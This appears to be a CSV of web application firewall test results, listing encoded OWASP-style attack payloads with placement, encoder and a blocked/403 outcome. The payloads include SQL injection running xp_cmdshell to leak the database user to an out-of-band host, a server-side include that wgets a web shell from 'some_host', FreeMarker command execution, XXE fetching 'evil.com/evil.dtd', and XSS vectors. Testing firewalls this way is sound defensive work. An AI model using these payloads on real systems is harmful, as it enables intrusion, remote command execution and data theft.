Payload,Check Status,Response Code,Placeholder,Encoder,Set,Case,Test Result
MzsvKiBhICovIERFQ0xBUkUgQGMgdmFyY2hhcigyNTUpOy8qIGIgKi9TRUxFQ1QgQGM9J3BpbmcgJyttYXN0ZXIuc3lzLmZuX3ZhcmJpbnRvaGV4c3RyKGNvbnZlcnQodmFyYmluYXJ5LFNZU1RFTV9VU0VSKSkrJy4wMDAuYnVycGNvbCcrJ2xhYm9yYXRvci5uZXQnOy8qeHgqLyBFWEVDIE1hc3Rlci5kYm8ueHBfY21kc2hlbGwgQGM7Lyp4eHgqLyBFWEVDIHNwX1NZU19Qcm90b09wIEBpZD0z,blocked,403,JSONRequest,Base64Flat,owasp,sql-injection,passed
MzsvKiBhICovIERFQ0xBUkUgQGMgdmFyY2hhcigyNTUpOy8qIGIgKi9TRUxFQ1QgQGM9J3BpbmcgJyttYXN0ZXIuc3lzLmZuX3ZhcmJpbnRvaGV4c3RyKGNvbnZlcnQodmFyYmluYXJ5LFNZU1RFTV9VU0VSKSkrJy4wMDAuYnVycGNvbCcrJ2xhYm9yYXRvci5uZXQnOy8qeHgqLyBFWEVDIE1hc3Rlci5kYm8ueHBfY21kc2hlbGwgQGM7Lyp4eHgqLyBFWEVDIHNwX1NZU19Qcm90b09wIEBpZD0z,blocked,403,HTMLForm,Base64Flat,owasp,sql-injection,passed
MzsvKiBhICovIERFQ0xBUkUgQGMgdmFyY2hhcigyNTUpOy8qIGIgKi9TRUxFQ1QgQGM9J3BpbmcgJyttYXN0ZXIuc3lzLmZuX3ZhcmJpbnRvaGV4c3RyKGNvbnZlcnQodmFyYmluYXJ5LFNZU1RFTV9VU0VSKSkrJy4wMDAuYnVycGNvbCcrJ2xhYm9yYXRvci5uZXQnOy8qeHgqLyBFWEVDIE1hc3Rlci5kYm8ueHBfY21kc2hlbGwgQGM7Lyp4eHgqLyBFWEVDIHNwX1NZU19Qcm90b09wIEBpZD0z,blocked,403,HTMLMultipartForm,Base64Flat,owasp,sql-injection,passed
MzsvKiBhICovIERFQ0xBUkUgQGMgdmFyY2hhcigyNTUpOy8qIGIgKi9TRUxFQ1QgQGM9J3BpbmcgJyttYXN0ZXIuc3lzLmZuX3ZhcmJpbnRvaGV4c3RyKGNvbnZlcnQodmFyYmluYXJ5LFNZU1RFTV9VU0VSKSkrJy4wMDAuYnVycGNvbCcrJ2xhYm9yYXRvci5uZXQnOy8qeHgqLyBFWEVDIE1hc3Rlci5kYm8ueHBfY21kc2hlbGwgQGM7Lyp4eHgqLyBFWEVDIHNwX1NZU19Qcm90b09wIEBpZD0z,blocked,403,Header,Base64Flat,owasp,sql-injection,passed
3%3B%2F%2A+a+%2A%2F+DECLARE+%40c+varchar%28255%29%3B%2F%2A+b+%2A%2FSELECT+%40c%3D%27ping+%27%2Bmaster.sys.fn_varbintohexstr%28convert%28varbinary%2CSYSTEM_USER%29%29%2B%27.000.burpcol%27%2B%27laborator.net%27%3B%2F%2Axx%2A%2F+EXEC+Master.dbo.xp_cmdshell+%40c%3B%2F%2Axxx%2A%2F+EXEC+sp_SYS_ProtoOp+%40id%3D3,blocked,403,URLPath,URL,owasp,sql-injection,passed
3%3B%2F%2A+a+%2A%2F+DECLARE+%40c+varchar%28255%29%3B%2F%2A+b+%2A%2FSELECT+%40c%3D%27ping+%27%2Bmaster.sys.fn_varbintohexstr%28convert%28varbinary%2CSYSTEM_USER%29%29%2B%27.000.burpcol%27%2B%27laborator.net%27%3B%2F%2Axx%2A%2F+EXEC+Master.dbo.xp_cmdshell+%40c%3B%2F%2Axxx%2A%2F+EXEC+sp_SYS_ProtoOp+%40id%3D3,blocked,403,URLParam,URL,owasp,sql-injection,passed
3%3B%2F%2A+a+%2A%2F+DECLARE+%40c+varchar%28255%29%3B%2F%2A+b+%2A%2FSELECT+%40c%3D%27ping+%27%2Bmaster.sys.fn_varbintohexstr%28convert%28varbinary%2CSYSTEM_USER%29%29%2B%27.000.burpcol%27%2B%27laborator.net%27%3B%2F%2Axx%2A%2F+EXEC+Master.dbo.xp_cmdshell+%40c%3B%2F%2Axxx%2A%2F+EXEC+sp_SYS_ProtoOp+%40id%3D3,blocked,403,Header,URL,owasp,sql-injection,passed
3%3B%2F%2A+a+%2A%2F+DECLARE+%40c+varchar%28255%29%3B%2F%2A+b+%2A%2FSELECT+%40c%3D%27ping+%27%2Bmaster.sys.fn_varbintohexstr%28convert%28varbinary%2CSYSTEM_USER%29%29%2B%27.000.burpcol%27%2B%27laborator.net%27%3B%2F%2Axx%2A%2F+EXEC+Master.dbo.xp_cmdshell+%40c%3B%2F%2Axxx%2A%2F+EXEC+sp_SYS_ProtoOp+%40id%3D3,blocked,403,JSONRequest,URL,owasp,sql-injection,passed
3%3B%2F%2A+a+%2A%2F+DECLARE+%40c+varchar%28255%29%3B%2F%2A+b+%2A%2FSELECT+%40c%3D%27ping+%27%2Bmaster.sys.fn_varbintohexstr%28convert%28varbinary%2CSYSTEM_USER%29%29%2B%27.000.burpcol%27%2B%27laborator.net%27%3B%2F%2Axx%2A%2F+EXEC+Master.dbo.xp_cmdshell+%40c%3B%2F%2Axxx%2A%2F+EXEC+sp_SYS_ProtoOp+%40id%3D3,blocked,403,HTMLForm,URL,owasp,sql-injection,passed
MTIzKSBBTkQgMTI9MTIgIEFORCBKU09OX0RFUFRIKCd7fScpICE9IDI1MjE,blocked,403,JSONRequest,Base64Flat,owasp,sql-injection,passed
MTIzKSBBTkQgMTI9MTIgIEFORCBKU09OX0RFUFRIKCd7fScpICE9IDI1MjE,blocked,403,URLPath,Base64Flat,owasp,sql-injection,passed
3%3B%2F%2A+a+%2A%2F+DECLARE+%40c+varchar%28255%29%3B%2F%2A+b+%2A%2FSELECT+%40c%3D%27ping+%27%2Bmaster.sys.fn_varbintohexstr%28convert%28varbinary%2CSYSTEM_USER%29%29%2B%27.000.burpcol%27%2B%27laborator.net%27%3B%2F%2Axx%2A%2F+EXEC+Master.dbo.xp_cmdshell+%40c%3B%2F%2Axxx%2A%2F+EXEC+sp_SYS_ProtoOp+%40id%3D3,blocked,403,HTMLMultipartForm,URL,owasp,sql-injection,passed
MTIzKSBBTkQgMTI9MTIgIEFORCBKU09OX0RFUFRIKCd7fScpICE9IDI1MjE,blocked,403,URLParam,Base64Flat,owasp,sql-injection,passed
MTIzKSBBTkQgMTI9MTIgIEFORCBKU09OX0RFUFRIKCd7fScpICE9IDI1MjE,blocked,403,HTMLForm,Base64Flat,owasp,sql-injection,passed
MTIzKSBBTkQgMTI9MTIgIEFORCBKU09OX0RFUFRIKCd7fScpICE9IDI1MjE,blocked,403,Header,Base64Flat,owasp,sql-injection,passed
MTIzKSBBTkQgMTI9MTIgIEFORCBKU09OX0RFUFRIKCd7fScpICE9IDI1MjE,blocked,403,HTMLMultipartForm,Base64Flat,owasp,sql-injection,passed
123%29+AND+12%3D12++AND+JSON_DEPTH%28%27%7B%7D%27%29+%21%3D+2521,blocked,403,URLPath,URL,owasp,sql-injection,passed
123%29+AND+12%3D12++AND+JSON_DEPTH%28%27%7B%7D%27%29+%21%3D+2521,blocked,403,URLParam,URL,owasp,sql-injection,passed
123%29+AND+12%3D12++AND+JSON_DEPTH%28%27%7B%7D%27%29+%21%3D+2521,blocked,403,JSONRequest,URL,owasp,sql-injection,passed
123%29+AND+12%3D12++AND+JSON_DEPTH%28%27%7B%7D%27%29+%21%3D+2521,blocked,403,HTMLMultipartForm,URL,owasp,sql-injection,passed
123%29+AND+12%3D12++AND+JSON_DEPTH%28%27%7B%7D%27%29+%21%3D+2521,blocked,403,Header,URL,owasp,sql-injection,passed
123%29+AND+12%3D12++AND+JSON_DEPTH%28%27%7B%7D%27%29+%21%3D+2521,blocked,403,HTMLForm,URL,owasp,sql-injection,passed
PCEtLSNleGVjIGNtZD0id2dldCBodHRwOi8vc29tZV9ob3N0L3NoZWxsLnR4dCB8IHJlbmFtZSBzaGVsbC50eHQgc2hlbGwucGhwIi0tPg,blocked,403,URLPath,Base64Flat,owasp,ss-include,passed
PCEtLSNleGVjIGNtZD0id2dldCBodHRwOi8vc29tZV9ob3N0L3NoZWxsLnR4dCB8IHJlbmFtZSBzaGVsbC50eHQgc2hlbGwucGhwIi0tPg,blocked,403,URLParam,Base64Flat,owasp,ss-include,passed
%3C%21--%23exec+cmd%3D%22wget+http%3A%2F%2Fsome_host%2Fshell.txt+%7C+rename+shell.txt+shell.php%22--%3E,blocked,403,URLPath,URL,owasp,ss-include,passed
PCEtLSNleGVjIGNtZD0id2dldCBodHRwOi8vc29tZV9ob3N0L3NoZWxsLnR4dCB8IHJlbmFtZSBzaGVsbC50eHQgc2hlbGwucGhwIi0tPg,blocked,403,HTMLForm,Base64Flat,owasp,ss-include,passed
PCEtLSNleGVjIGNtZD0id2dldCBodHRwOi8vc29tZV9ob3N0L3NoZWxsLnR4dCB8IHJlbmFtZSBzaGVsbC50eHQgc2hlbGwucGhwIi0tPg,blocked,403,HTMLMultipartForm,Base64Flat,owasp,ss-include,passed
%3C%21--%23exec+cmd%3D%22wget+http%3A%2F%2Fsome_host%2Fshell.txt+%7C+rename+shell.txt+shell.php%22--%3E,blocked,403,HTMLForm,URL,owasp,ss-include,passed
%3C%21--%23exec+cmd%3D%22wget+http%3A%2F%2Fsome_host%2Fshell.txt+%7C+rename+shell.txt+shell.php%22--%3E,blocked,403,URLParam,URL,owasp,ss-include,passed
%3C%21--%23exec+cmd%3D%22wget+http%3A%2F%2Fsome_host%2Fshell.txt+%7C+rename+shell.txt+shell.php%22--%3E,blocked,403,HTMLMultipartForm,URL,owasp,ss-include,passed
PCEtLSNleGVjIGNtZD0ibHMiIC0tPg,blocked,403,URLParam,Base64Flat,owasp,ss-include,passed
PCEtLSNleGVjIGNtZD0ibHMiIC0tPg,blocked,403,URLPath,Base64Flat,owasp,ss-include,passed
PCEtLSNleGVjIGNtZD0ibHMiIC0tPg,blocked,403,HTMLForm,Base64Flat,owasp,ss-include,passed
%3C%21--%23exec+cmd%3D%22ls%22+--%3E,blocked,403,URLPath,URL,owasp,ss-include,passed
PCEtLSNleGVjIGNtZD0ibHMiIC0tPg,blocked,403,HTMLMultipartForm,Base64Flat,owasp,ss-include,passed
%3C%21--%23exec+cmd%3D%22ls%22+--%3E,blocked,403,HTMLForm,URL,owasp,ss-include,passed
%3C%21--%23exec+cmd%3D%22ls%22+--%3E,blocked,403,URLParam,URL,owasp,ss-include,passed
%3C%21--%23exec+cmd%3D%22ls%22+--%3E,blocked,403,HTMLMultipartForm,URL,owasp,ss-include,passed
PCEtLSNleGVjIGNtZD0iZGlyIiAtLT4,blocked,403,URLPath,Base64Flat,owasp,ss-include,passed
PCEtLSNleGVjIGNtZD0iZGlyIiAtLT4,blocked,403,URLParam,Base64Flat,owasp,ss-include,passed
PCEtLSNleGVjIGNtZD0iZGlyIiAtLT4,blocked,403,HTMLMultipartForm,Base64Flat,owasp,ss-include,passed
PCEtLSNleGVjIGNtZD0iZGlyIiAtLT4,blocked,403,HTMLForm,Base64Flat,owasp,ss-include,passed
%3C%21--%23exec+cmd%3D%22dir%22+--%3E,blocked,403,URLPath,URL,owasp,ss-include,passed
%3C%21--%23exec+cmd%3D%22dir%22+--%3E,blocked,403,URLParam,URL,owasp,ss-include,passed
%3C%21--%23exec+cmd%3D%22dir%22+--%3E,blocked,403,HTMLForm,URL,owasp,ss-include,passed
PCNhc3NpZ24gZXggPSAiZnJlZW1hcmtlci50ZW1wbGF0ZS51dGlsaXR5LkV4ZWN1dGUiP25ldygpPiR7IGV4KCJpZCIpfQ,blocked,403,URLPath,Base64Flat,owasp,sst-injection,passed
%3C%21--%23exec+cmd%3D%22dir%22+--%3E,blocked,403,HTMLMultipartForm,URL,owasp,ss-include,passed
PCNhc3NpZ24gZXggPSAiZnJlZW1hcmtlci50ZW1wbGF0ZS51dGlsaXR5LkV4ZWN1dGUiP25ldygpPiR7IGV4KCJpZCIpfQ,blocked,403,HTMLForm,Base64Flat,owasp,sst-injection,passed
PCNhc3NpZ24gZXggPSAiZnJlZW1hcmtlci50ZW1wbGF0ZS51dGlsaXR5LkV4ZWN1dGUiP25ldygpPiR7IGV4KCJpZCIpfQ,blocked,403,URLParam,Base64Flat,owasp,sst-injection,passed
PCNhc3NpZ24gZXggPSAiZnJlZW1hcmtlci50ZW1wbGF0ZS51dGlsaXR5LkV4ZWN1dGUiP25ldygpPiR7IGV4KCJpZCIpfQ,blocked,403,HTMLMultipartForm,Base64Flat,owasp,sst-injection,passed
%3C%23assign+ex+%3D+%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%24%7B+ex%28%22id%22%29%7D,blocked,403,URLPath,URL,owasp,sst-injection,passed
%3C%23assign+ex+%3D+%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%24%7B+ex%28%22id%22%29%7D,blocked,403,URLParam,URL,owasp,sst-injection,passed
%3C%23assign+ex+%3D+%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%24%7B+ex%28%22id%22%29%7D,blocked,403,HTMLMultipartForm,URL,owasp,sst-injection,passed
%3C%23assign+ex+%3D+%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%24%7B+ex%28%22id%22%29%7D,blocked,403,HTMLForm,URL,owasp,sst-injection,passed
YWFhYVx1MDAyNyUyYiN7MTYqODc4N30lMmJcdTAwMjdiYmI,blocked,403,URLPath,Base64Flat,owasp,sst-injection,passed
YWFhYVx1MDAyNyUyYiN7MTYqODc4N30lMmJcdTAwMjdiYmI,blocked,403,URLParam,Base64Flat,owasp,sst-injection,passed
YWFhYVx1MDAyNyUyYiN7MTYqODc4N30lMmJcdTAwMjdiYmI,blocked,403,HTMLForm,Base64Flat,owasp,sst-injection,passed
YWFhYVx1MDAyNyUyYiN7MTYqODc4N30lMmJcdTAwMjdiYmI,blocked,403,HTMLMultipartForm,Base64Flat,owasp,sst-injection,passed
aaaa%5Cu0027%252b%23%7B16%2A8787%7D%252b%5Cu0027bbb,blocked,403,URLPath,URL,owasp,sst-injection,passed
aaaa%5Cu0027%252b%23%7B16%2A8787%7D%252b%5Cu0027bbb,blocked,403,URLParam,URL,owasp,sst-injection,passed
aaaa%5Cu0027%252b%23%7B16%2A8787%7D%252b%5Cu0027bbb,blocked,403,HTMLForm,URL,owasp,sst-injection,passed
e3sxMzM3KjEzMzh9fQ,blocked,403,URLParam,Base64Flat,owasp,sst-injection,passed
aaaa%5Cu0027%252b%23%7B16%2A8787%7D%252b%5Cu0027bbb,blocked,403,HTMLMultipartForm,URL,owasp,sst-injection,passed
e3sxMzM3KjEzMzh9fQ,blocked,403,HTMLForm,Base64Flat,owasp,sst-injection,passed
e3sxMzM3KjEzMzh9fQ,blocked,403,URLPath,Base64Flat,owasp,sst-injection,passed
e3sxMzM3KjEzMzh9fQ,blocked,403,HTMLMultipartForm,Base64Flat,owasp,sst-injection,passed
%7B%7B1337%2A1338%7D%7D,blocked,403,URLPath,URL,owasp,sst-injection,passed
%7B%7B1337%2A1338%7D%7D,blocked,403,HTMLForm,URL,owasp,sst-injection,passed
%7B%7B1337%2A1338%7D%7D,blocked,403,URLParam,URL,owasp,sst-injection,passed
%7B%7B1337%2A1338%7D%7D,blocked,403,HTMLMultipartForm,URL,owasp,sst-injection,passed
"<!DOCTYPE x [ <!ENTITY % y SYSTEM ""//y/y"" > %y; ]><x>a</x>",blocked,403,XMLBody,Plain,owasp,xml-injection,passed
"<!DOCTYPE x SYSTEM ""//x/x"" > <x>a</x>",blocked,403,XMLBody,Plain,owasp,xml-injection,passed
"<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""http://host/text.txt"" > ] > <foo>&xxe;</foo>",blocked,403,XMLBody,Plain,owasp,xml-injection,passed
"<?xml version=""1.0"" encoding=""utf-8"" standalone=""no"" ?><xs:schema xmlns:xs=""http://www.w3.org/2001/XMLSchema""><xs:include namespace=""http://xxe-xsinclude-namespace.yourdomain[.]com/""/></xs:schema>",blocked,403,XMLBody,Plain,owasp,xml-injection,passed
"<?xml version=""1.0"" encoding=""utf-8"" standalone=""no"" ?><x xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xsi:schemaLocation=""http://xxe-xsi-schemalocation.yourdomain[.]com/""/>",blocked,403,XMLBody,Plain,owasp,xml-injection,passed
PGJvZHkgb25sb2FkPWFsZXJ0KCd0ZXN0MScpPg,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
"<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE x [<!ENTITY % xxe PUBLIC ""any_text"" ""http://evil.com/evil.dtd"">%xxe;]><root>&xxe;</root>",blocked,403,XMLBody,Plain,owasp,xml-injection,passed
PGJvZHkgb25sb2FkPWFsZXJ0KCd0ZXN0MScpPg,blocked,403,URLParam,Base64Flat,owasp,xss-scripting,passed
PGJvZHkgb25sb2FkPWFsZXJ0KCd0ZXN0MScpPg,blocked,403,HTMLForm,Base64Flat,owasp,xss-scripting,passed
%3Cbody+onload%3Dalert%28%27test1%27%29%3E,blocked,403,URLPath,URL,owasp,xss-scripting,passed
PGJvZHkgb25sb2FkPWFsZXJ0KCd0ZXN0MScpPg,blocked,403,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,passed
%3Cbody+onload%3Dalert%28%27test1%27%29%3E,blocked,403,URLParam,URL,owasp,xss-scripting,passed
%3Cbody+onload%3Dalert%28%27test1%27%29%3E,blocked,403,HTMLMultipartForm,URL,owasp,xss-scripting,passed
%3Cbody+onload%3Dalert%28%27test1%27%29%3E,blocked,403,HTMLForm,URL,owasp,xss-scripting,passed
PElNRyBTUkM9aiYjWDQxdmFzY3JpcHQ6YWxlcnQoJ3Rlc3QnKT4,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
PElNRyBTUkM9aiYjWDQxdmFzY3JpcHQ6YWxlcnQoJ3Rlc3QnKT4,blocked,403,URLParam,Base64Flat,owasp,xss-scripting,passed
PElNRyBTUkM9aiYjWDQxdmFzY3JpcHQ6YWxlcnQoJ3Rlc3QnKT4,blocked,403,HTMLForm,Base64Flat,owasp,xss-scripting,passed
PElNRyBTUkM9aiYjWDQxdmFzY3JpcHQ6YWxlcnQoJ3Rlc3QnKT4,blocked,403,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,passed
%3CIMG+SRC%3Dj%26%23X41vascript%3Aalert%28%27test%27%29%3E,blocked,403,URLPath,URL,owasp,xss-scripting,passed
%3CIMG+SRC%3Dj%26%23X41vascript%3Aalert%28%27test%27%29%3E,blocked,403,URLParam,URL,owasp,xss-scripting,passed
%3CIMG+SRC%3Dj%26%23X41vascript%3Aalert%28%27test%27%29%3E,blocked,403,HTMLForm,URL,owasp,xss-scripting,passed
%3CIMG+SRC%3Dj%26%23X41vascript%3Aalert%28%27test%27%29%3E,blocked,403,HTMLMultipartForm,URL,owasp,xss-scripting,passed
Im9ud2hlZWw9ZWFkKDExMSk,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
Im9ud2hlZWw9ZWFkKDExMSk,blocked,403,URLParam,Base64Flat,owasp,xss-scripting,passed
Im9ud2hlZWw9ZWFkKDExMSk,blocked,403,HTMLForm,Base64Flat,owasp,xss-scripting,passed
Im9ud2hlZWw9ZWFkKDExMSk,blocked,403,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,passed
%22onwheel%3Dead%28111%29,blocked,403,URLPath,URL,owasp,xss-scripting,passed
%22onwheel%3Dead%28111%29,blocked,403,HTMLForm,URL,owasp,xss-scripting,passed
%22onwheel%3Dead%28111%29,blocked,403,HTMLMultipartForm,URL,owasp,xss-scripting,passed
%22onwheel%3Dead%28111%29,blocked,403,URLParam,URL,owasp,xss-scripting,passed
X19wcm90b19fW3YtaWZdPV9jLmNvbnN0cnVjdG9yKCdhbGVydCgxKScpKCk,blocked,403,URLParam,Base64Flat,owasp,xss-scripting,passed
X19wcm90b19fW3YtaWZdPV9jLmNvbnN0cnVjdG9yKCdhbGVydCgxKScpKCk,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
X19wcm90b19fW3YtaWZdPV9jLmNvbnN0cnVjdG9yKCdhbGVydCgxKScpKCk,blocked,403,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,passed
X19wcm90b19fW3YtaWZdPV9jLmNvbnN0cnVjdG9yKCdhbGVydCgxKScpKCk,blocked,403,HTMLForm,Base64Flat,owasp,xss-scripting,passed
__proto__%5Bv-if%5D%3D_c.constructor%28%27alert%281%29%27%29%28%29,blocked,403,URLParam,URL,owasp,xss-scripting,passed
__proto__%5Bv-if%5D%3D_c.constructor%28%27alert%281%29%27%29%28%29,blocked,403,HTMLForm,URL,owasp,xss-scripting,passed
__proto__%5Bv-if%5D%3D_c.constructor%28%27alert%281%29%27%29%28%29,blocked,403,URLPath,URL,owasp,xss-scripting,passed
__proto__%5Bv-if%5D%3D_c.constructor%28%27alert%281%29%27%29%28%29,blocked,403,HTMLMultipartForm,URL,owasp,xss-scripting,passed
c29tZXRleHQ8c3ZnIG9ubG9hZD1hbGVydChkb2N1bWVudC5kb21haW4pPj9taW1lVHlwZT10ZXh0L2h0bWw,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
c29tZXRleHQ8c3ZnIG9ubG9hZD1hbGVydChkb2N1bWVudC5kb21haW4pPj9taW1lVHlwZT10ZXh0L2h0bWw,blocked,403,HTMLForm,Base64Flat,owasp,xss-scripting,passed
c29tZXRleHQ8c3ZnIG9ubG9hZD1hbGVydChkb2N1bWVudC5kb21haW4pPj9taW1lVHlwZT10ZXh0L2h0bWw,blocked,403,URLParam,Base64Flat,owasp,xss-scripting,passed
c29tZXRleHQ8c3ZnIG9ubG9hZD1hbGVydChkb2N1bWVudC5kb21haW4pPj9taW1lVHlwZT10ZXh0L2h0bWw,blocked,403,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,passed
sometext%3Csvg+onload%3Dalert%28document.domain%29%3E%3FmimeType%3Dtext%2Fhtml,blocked,403,URLPath,URL,owasp,xss-scripting,passed
sometext%3Csvg+onload%3Dalert%28document.domain%29%3E%3FmimeType%3Dtext%2Fhtml,blocked,403,URLParam,URL,owasp,xss-scripting,passed
sometext%3Csvg+onload%3Dalert%28document.domain%29%3E%3FmimeType%3Dtext%2Fhtml,blocked,403,HTMLForm,URL,owasp,xss-scripting,passed
IikpO2lmKCFzZWxmLngpc2VsZi54PSFhbGVydChkb2N1bWVudC5kb21haW4pfWNhdGNoKGUpe30vLw,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
sometext%3Csvg+onload%3Dalert%28document.domain%29%3E%3FmimeType%3Dtext%2Fhtml,blocked,403,HTMLMultipartForm,URL,owasp,xss-scripting,passed
IikpO2lmKCFzZWxmLngpc2VsZi54PSFhbGVydChkb2N1bWVudC5kb21haW4pfWNhdGNoKGUpe30vLw,blocked,403,URLParam,Base64Flat,owasp,xss-scripting,passed
IikpO2lmKCFzZWxmLngpc2VsZi54PSFhbGVydChkb2N1bWVudC5kb21haW4pfWNhdGNoKGUpe30vLw,blocked,403,HTMLForm,Base64Flat,owasp,xss-scripting,passed
%22%29%29%3Bif%28%21self.x%29self.x%3D%21alert%28document.domain%29%7Dcatch%28e%29%7B%7D%2F%2F,blocked,403,URLPath,URL,owasp,xss-scripting,passed
IikpO2lmKCFzZWxmLngpc2VsZi54PSFhbGVydChkb2N1bWVudC5kb21haW4pfWNhdGNoKGUpe30vLw,blocked,403,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,passed
%22%29%29%3Bif%28%21self.x%29self.x%3D%21alert%28document.domain%29%7Dcatch%28e%29%7B%7D%2F%2F,blocked,403,URLParam,URL,owasp,xss-scripting,passed
PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KGRvY3VtZW50LmRvbWFpbik+L2FsbA,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
%22%29%29%3Bif%28%21self.x%29self.x%3D%21alert%28document.domain%29%7Dcatch%28e%29%7B%7D%2F%2F,blocked,403,HTMLForm,URL,owasp,xss-scripting,passed
%22%29%29%3Bif%28%21self.x%29self.x%3D%21alert%28document.domain%29%7Dcatch%28e%29%7B%7D%2F%2F,blocked,403,HTMLMultipartForm,URL,owasp,xss-scripting,passed
PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KGRvY3VtZW50LmRvbWFpbik+L2FsbA,blocked,403,HTMLForm,Base64Flat,owasp,xss-scripting,passed
PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KGRvY3VtZW50LmRvbWFpbik+L2FsbA,blocked,403,URLParam,Base64Flat,owasp,xss-scripting,passed
PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KGRvY3VtZW50LmRvbWFpbik+L2FsbA,blocked,403,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,passed
%3Cimg+src%3Dx+onerror%3Dalert%28document.domain%29%3E%2Fall,blocked,403,URLPath,URL,owasp,xss-scripting,passed
%3Cimg+src%3Dx+onerror%3Dalert%28document.domain%29%3E%2Fall,blocked,403,URLParam,URL,owasp,xss-scripting,passed
%3Cimg+src%3Dx+onerror%3Dalert%28document.domain%29%3E%2Fall,blocked,403,HTMLMultipartForm,URL,owasp,xss-scripting,passed
Y29uZmlybS5jYWxsKG51bGwsMSk,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
Y29uZmlybS5jYWxsKG51bGwsMSk,blocked,403,URLParam,Base64Flat,owasp,xss-scripting,passed
%3Cimg+src%3Dx+onerror%3Dalert%28document.domain%29%3E%2Fall,blocked,403,HTMLForm,URL,owasp,xss-scripting,passed
Y29uZmlybS5jYWxsKG51bGwsMSk,blocked,403,HTMLForm,Base64Flat,owasp,xss-scripting,passed
Y29uZmlybS5jYWxsKG51bGwsMSk,blocked,403,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,passed
confirm.call%28null%2C1%29,blocked,403,URLPath,URL,owasp,xss-scripting,passed
confirm.call%28null%2C1%29,blocked,403,HTMLForm,URL,owasp,xss-scripting,passed
confirm.call%28null%2C1%29,blocked,403,URLParam,URL,owasp,xss-scripting,passed
confirm.call%28null%2C1%29,blocked,403,HTMLMultipartForm,URL,owasp,xss-scripting,passed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnYWxlJysncnQoZG9jdW1lbnQuZG9tYWluKScp,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnYWxlJysncnQoZG9jdW1lbnQuZG9tYWluKScp,blocked,403,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,passed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnYWxlJysncnQoZG9jdW1lbnQuZG9tYWluKScp,blocked,403,URLParam,Base64Flat,owasp,xss-scripting,passed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnYWxlJysncnQoZG9jdW1lbnQuZG9tYWluKScp,blocked,403,HTMLForm,Base64Flat,owasp,xss-scripting,passed
javascript%3AsetInterval%28%27ale%27%2B%27rt%28document.domain%29%27%29,blocked,403,URLPath,URL,owasp,xss-scripting,passed
javascript%3AsetInterval%28%27ale%27%2B%27rt%28document.domain%29%27%29,blocked,403,URLParam,URL,owasp,xss-scripting,passed
javascript%3AsetInterval%28%27ale%27%2B%27rt%28document.domain%29%27%29,blocked,403,HTMLMultipartForm,URL,owasp,xss-scripting,passed
javascript%3AsetInterval%28%27ale%27%2B%27rt%28document.domain%29%27%29,blocked,403,HTMLForm,URL,owasp,xss-scripting,passed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnZmV0JysnY2goZG9jdW1lbnQuZG9tYWluKScp,blocked,403,URLPath,Base64Flat,owasp,xss-scripting,passed
